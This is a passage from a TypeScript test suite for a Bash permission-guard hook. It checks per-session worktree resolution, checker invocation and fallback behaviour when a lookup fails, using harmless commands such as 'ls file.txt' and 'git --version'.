      resolver: async (sessionID: string): Promise<string | null> => {
        calls.push({ sessionID, directory: worktrees[sessionID] });
        if (options.fail) throw new Error("sdk unavailable");
        return worktrees[sessionID] ?? null;
      },
    };
  }

  it("one live hook instance handles two selected-check calls from distinct sessions and worktrees with a fresh lookup per call", async () => {
    const { projectDir, checkerLog } = makeCheckProject();
    const worktreeA = fs.mkdtempSync(path.join(os.tmpdir(), "obg-hooks-wt-a-"));
    const worktreeB = fs.mkdtempSync(path.join(os.tmpdir(), "obg-hooks-wt-b-"));
    checkerDirs.push(worktreeA, worktreeB);
    const { calls, resolver } = makeResolver({ "session-a": worktreeA, "session-b": worktreeB });
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: projectDir }, capture.replyPermission, resolver);
    await configureHooks(hooks);

    await executeBefore(hooks, { tool: "Bash", sessionID: "session-a", callID: "call-a", command: "chk file" });
    await executeBefore(hooks, { tool: "Bash", sessionID: "session-b", callID: "call-b", command: "chk file" });

    expect(calls.map((c) => c.sessionID)).toEqual(["session-a", "session-b"]);
    const lines = fs.readFileSync(checkerLog, "utf8").trim().split("\n").map((line) => JSON.parse(line));
    expect(lines).toHaveLength(2);
    for (const [index, sessionID] of ["session-a", "session-b"].entries()) {
      const worktree = index === 0 ? worktreeA : worktreeB;
      const request = JSON.parse(lines[index].rawRequest);
      expect(lines[index].processCwd).toBe(worktree);
      expect(request.context.cwd).toBe(worktree);
      expect(request.context.sessionID).toBe(sessionID);
      expect(request.command).toEqual({ raw: "chk file", executable: "chk", argv: ["file"] });
      expect(request.match.ruleId).toBe("tool:0/matcher:0");
    }
  });

  it("a path-only invocation with no selected checks performs a fresh lookup; an invocation with neither need performs none", async () => {
    const { projectDir, checkerLog } = makeCheckProject();
    const worktree = fs.mkdtempSync(path.join(os.tmpdir(), "obg-hooks-wt-c-"));
    checkerDirs.push(worktree);
    const { calls, resolver } = makeResolver({ "session-c": worktree });
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: projectDir }, capture.replyPermission, resolver);
    await configureHooks(hooks);

    const pathOnly = await executeBefore(hooks, { tool: "Bash", sessionID: "session-c", callID: "call-path", command: "ls file.txt" });
    expect(calls).toHaveLength(1);

    const neither = await executeBefore(hooks, { tool: "Bash", sessionID: "session-c", callID: "call-neither", command: "git --version" });
    expect(calls).toHaveLength(1);
    expect(neither.command).toBe("{ git --version; }");
    expect(fs.existsSync(checkerLog)).toBe(false);
  });

  it("failed lookup: selected checks map to onError without spawning and relative paths resolve at least to ask", async () => {
    const { projectDir, checkerLog } = makeCheckProject();
    const { calls, resolver } = makeResolver({ "session-d": undefined }, { fail: true });
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: projectDir }, capture.replyPermission, resolver);
    await configureHooks(hooks);

    const checkedOutput = await executeBefore(hooks, { tool: "Bash", sessionID: "session-d", callID: "call-checked", command: "chk file" });
    expect(calls).toHaveLength(1);
    expect(fs.existsSync(checkerLog)).toBe(false);
    expect(checkedOutput.command).toBe("{ chk file; }");

    const pathOutput = await executeBefore(hooks, { tool: "Bash", sessionID: "session-d", callID: "call-path", command: "ls file.txt" });
    expect(pathOutput.command).toBe("{ ls file.txt; }");

    calls.length = 0;
    const unrelated = await executeBefore(hooks, { tool: "Bash", sessionID: "session-d", callID: "call-unrelated", command: "git --version" });
    expect(calls).toHaveLength(0);
    expect(unrelated.command).toBe("{ git --version; }");
  });

  it("missing Session.directory behaves like lookup failure", async () => {
    const { projectDir, checkerLog } = makeCheckProject();
    const { calls, resolver } = makeResolver({ "session-e": undefined });
    const capture = createReplyCapture();
    const hooks = createBashGuardHooks({ directory: projectDir }, capture.replyPermission, resolver);
    await configureHooks(hooks);

    const output = await executeBefore(hooks, { tool: "Bash", sessionID: "session-e", callID: "call-checked", command: "chk file" });
    expect(calls).toHaveLength(1);
    expect(fs.existsSync(checkerLog)).toBe(false);
    expect(output.command).toBe("{ chk file; }");
  });
});
